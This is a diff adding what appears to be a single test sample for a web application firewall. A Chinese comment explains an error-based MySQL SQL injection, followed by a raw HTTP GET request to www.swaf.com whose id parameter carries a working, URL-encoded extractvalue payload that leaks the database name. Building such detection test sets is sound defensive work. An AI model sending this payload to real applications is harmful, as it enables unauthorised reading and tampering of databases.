@@ -1,0 +1,9 @@
+# SQL注入_GET_mysql_报错注入-06506236
+# 基于报错注入,该SQL注入语句的攻击手法是通过使用MySQL的extractvalue函数和right函数来获取数据库名称的右侧子串。在该sql注入语句中，concat_ws函数将特殊字符（0x23表示#号）与数据库名称连接起来，并作为参数传递给extractvalue函数。通过right函数指定从连接字符串右侧提取子串的长度，攻击者试图获取数据库名称的右侧子串。攻击目的是通过注入恶意的SQL代码来绕过应用程序的输入验证和过滤机制，从而执行恶意操作，如窃取敏感数据、修改数据或破坏数据库。
+GET /?id=1%20and%20extractvalue%281%2Cright%28concat_ws%280x23%2C0x23%2Cdatabase%28%29%2C0x23%29%2C100%29%29&bid=hd_tag_m8mv24ew HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv24ew
+RM-PRO-Token: d2463f6ce5db0e31279552a8b94f51f0
+RM-PRO-Time: 1742808379156
+User-Agent: curl/7.83.1
+
